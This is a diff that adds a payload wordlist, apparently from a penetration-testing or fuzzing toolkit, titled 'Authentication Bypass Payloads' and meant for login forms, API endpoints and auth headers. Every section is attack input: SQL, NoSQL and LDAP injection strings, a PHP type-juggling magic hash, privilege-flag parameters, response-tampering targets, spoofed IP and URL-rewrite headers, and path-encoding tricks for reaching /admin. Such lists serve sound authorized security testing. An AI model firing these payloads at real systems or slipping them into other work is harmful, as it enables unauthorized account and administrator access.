@@ -1,0 +1,101 @@
+# Authentication Bypass Payloads
+# Use in login forms, API endpoints, auth headers
+# Expand through research phase
+
+# === SQL INJECTION IN AUTH ===
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+') OR ('1'='1'--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+
+# === NOSQL INJECTION ===
+{"$gt": ""}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$exists": true}
+admin' && this.password.match(/.*/)//+%00
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# === LDAP INJECTION ===
+*
+*)(&
+*)(uid=*))(|(uid=*
+admin)(|(password=*))
+
+# === TYPE JUGGLING (PHP) ===
+0
+true
+[]
+0e462097431906509019562988736854
+
+# === NULL/EMPTY BYPASSES ===
+null
+NULL
+None
+undefined
+''
+""
+[]
+{}
+
+# === PARAMETER MANIPULATION ===
+admin=true
+isAdmin=true
+role=admin
+privilege=administrator
+auth=1
+authenticated=true
+user_level=9999
+
+# === RESPONSE MANIPULATION TARGETS ===
+# Change these in response:
+"authenticated": false → "authenticated": true
+"success": false → "success": true
+"role": "user" → "role": "admin"
+HTTP 403 → HTTP 200
+HTTP 401 → HTTP 200
+
+# === HTTP VERB TAMPERING ===
+# Try these methods on restricted endpoints:
+GET
+POST
+PUT
+PATCH
+DELETE
+HEAD
+OPTIONS
+TRACE
+CONNECT
+
+# === HEADER INJECTION ===
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+
+# === PATH BYPASS ===
+/admin → /Admin
+/admin → /ADMIN
+/admin → /admin/
+/admin → /admin//
+/admin → /./admin
+/admin → /admin/.
+/admin → /%2fadmin
+/admin → /admin%00
+/admin → /admin%20
+/admin → /admin%09
+/admin → /;/admin
+/admin → /.;/admin
